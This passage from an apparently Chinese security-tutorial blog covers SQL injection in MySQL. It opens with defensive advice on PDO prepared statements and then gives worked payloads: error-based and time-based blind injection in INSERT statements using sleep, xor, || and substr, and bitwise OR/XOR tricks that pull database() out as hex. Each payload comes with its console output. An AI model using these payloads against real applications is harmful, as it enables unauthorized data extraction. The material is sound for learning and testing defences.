可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程， 非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。 在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。 预编译可以完全杜绝注入攻击吗 在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。 总结 1231、使用PDO时尽量使用非模拟预处理。2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。3、SQL语句模板不使用变量动态拼接生成 关于orderby不能参数化查询的问题 原因： order by后面拼接字段名，字段名不能加引号。 在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。 insert、update注入利用报错注入12insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句 or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- 无回显注入(盲注) 利用xor、||、&amp;&amp;、+,-,*,/ 1234567mysql&gt; select (sleep(10));+-------------+| (sleep(10)) |+-------------+| 0 |+-------------+1 row in set (10.00 sec) 实例： 1234567891011121314151617mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.03 sec)mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.02 sec)mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.03 sec)mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.02 sec)mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.09 sec)mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.01 sec) 配合if、substr等函数进行盲注。 12345mysql&gt; insert into math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);Query OK, 1 row affected (10.00 sec) 有回显注入(符号) 实例： 按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。 这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#int型按位或mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected, 1 warning (0.03 sec)mysql&gt; select * from steady;+----------+----------+-----------+------+| userid | username | signature | mood |+----------+----------+-----------+------+| 74657374 | 0 | test | 0 |+----------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(74657374);+-----------------+| unhex(74657374) |+-----------------+| test |+-----------------+1 row in set (0.00 sec)#int型按位异或mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected, 1 warning (0.03 sec)mysql&gt; select * from ctf;+----------+----------+-----------+------+| userid | username | signature | mood |+----------+----------+-----------+------+| 74657338 | 0 | test | 0 |+----------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(100^74657338);+---------------------+| unhex(100^74657338) |+---------------------+| test |+---------------------+1 row in set (0.00 sec)#字符型按位或mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.02 sec)mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 74657374 | test | 0 |+--------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(74657374);+-----------------+| unhex(74657374) |+-----------------+| test |+-----------------+1 row in set (0.00 sec)#字符型按位异或mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.03 sec)mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 74657338 | test | 0 |+--------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(&#39;100&#39;^74657338);+-----------------------+| unhex(&#39;100&#39;^74657338) |+-----------------------+| test |+-----------------------+1 row in set (0.00 sec) mysql运算符 按位或运算符–｜ 0与任意的数字b或都为b 1234567891011121314151617181920212223mysql&gt; mysql&gt; select (0|1);+-------+| (0|1) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select (0|2323);+----------+| (0|2323) |+----------+| 2323 |+----------+1 row in set (0.01 sec)mysql&gt; select (0|452323);+------------+| (0|452323) |+------------+| 452323 |+------------+1 row in set (0.00 sec) 按位异或运算符–^ 0与任意的数字b异或都是b 12345678910111213141516mysql&gt; select (0^452323);+------------+| (0^452323) |+------------+| 452323 |+------------+1 row in set (0.00 sec)mysql&gt; select (0^5644);+----------+| (0^5644) |+----------+| 5644 |+----------+1 row in set (0.00 sec) 其他数字a与任意数字b异或得到c 可以通过c与a异或得到b，通常b是我们sql注入想要的数据库 123456789101112131415mysql&gt; select (10^5644);+-----------+| (10^5644) |+-----------+| 5638 |+-----------+1 row in set (0.00 sec)mysql&gt; select (10^5638);+-----------+| (10^5638) |+-----------+| 5644 |+-----------+1 row in set (0.00 sec)","categories":[],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://example.com/tags/OWSP-TOP10/"}]}],"categories":[],"tags":[{"name":"内网","slug":"内网","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91/"},{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://example.com/tags/OWSP-TOP10/"}]}